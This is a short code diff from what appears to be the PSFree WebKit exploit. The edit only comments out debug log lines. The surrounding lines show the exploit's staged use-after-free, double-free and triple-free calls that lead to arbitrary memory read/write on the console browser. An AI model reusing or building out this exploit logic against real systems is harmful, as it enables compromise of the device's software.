@@ -620,7 +620,7 @@ async function setup_arw(save, ssv_data) {
 
     for (const msg of msgs) {
         if (msg.data !== '') {
-            debug_log('[+] Webkit exploit (PSFree) (achieved arbitrary r/w)');
+            //debug_log('[+] Webkit exploit (PSFree) (achieved arbitrary r/w)');
 
 
             const u = new Uint8Array(msg.data);
@@ -703,22 +703,22 @@ async function get_ready() {
 }
 
 async function run_psfree() {
-    debug_log('[+] Webkit exploit (PSFree) (Step 0 - Readying)');
+    //debug_log('[+] Webkit exploit (PSFree) (Step 0 - Readying)');
     await get_ready();
 
-    debug_log('[+] Webkit exploit (PSFree) (Step 1 - UAF)');
+    //debug_log('[+] Webkit exploit (PSFree) (Step 1 - UAF)');
     await use_after_free(pop, s1);
 
     // we trigger the leak first because it is more likely to work
     // than if it were to happen during the second ssv smashing
     // on the ps4
-    debug_log('[+] Webkit exploit (PSFree) (Step 2 - Double free)');
+    //debug_log('[+] Webkit exploit (PSFree) (Step 2 - Double free)');
     // * keeps setup_ar()'s total sleep even lower
     // * also helps the garbage collector scheduling for 9.xx
     await sleep(0);
     await double_free(s1);
 
-    debug_log('[+] Webkit exploit (PSFree) (Step 2 - Triple free)');
+    //debug_log('[+] Webkit exploit (PSFree) (Step 2 - Triple free)');
     await triple_free(s1, jsview, view_leak_arr, view_leak);
 
     // clear_log();
